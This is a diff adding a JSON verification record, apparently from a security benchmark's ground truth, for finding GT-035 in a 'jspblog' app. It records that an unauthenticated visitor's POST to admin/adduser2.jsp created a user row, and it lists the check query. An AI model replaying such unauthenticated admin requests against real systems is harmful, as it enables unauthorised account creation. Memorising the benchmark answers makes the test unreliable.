@@ -1,0 +1,28 @@
+{
+  "gt_id": "GT-035",
+  "app": "jspblog",
+  "verified_at": "2026-09-06T08:42:47.160064+00:00",
+  "verdict": "vulnerable",
+  "summary": "visitor POST admin/adduser2.jsp returned 200; a user row with the token name was created in the portal database (created=True).",
+  "sql_statements": [
+    {
+      "kind": "scalar",
+      "sql": "SELECT COUNT(*) FROM user WHERE name='DRHLGT_user_8684167034'"
+    }
+  ],
+  "steps": [
+    {
+      "kind": "instrument",
+      "table": "user",
+      "token_name": "DRHLGT_user_8684167034"
+    },
+    {
+      "kind": "replay",
+      "role": "visitor (no login)",
+      "request": "POST admin/adduser2.jsp name=DRHLGT_user_8684167034",
+      "status_code": 200,
+      "user_row_created": true,
+      "body_saved": "GT-035_gt035_visitor.html"
+    }
+  ]
+}
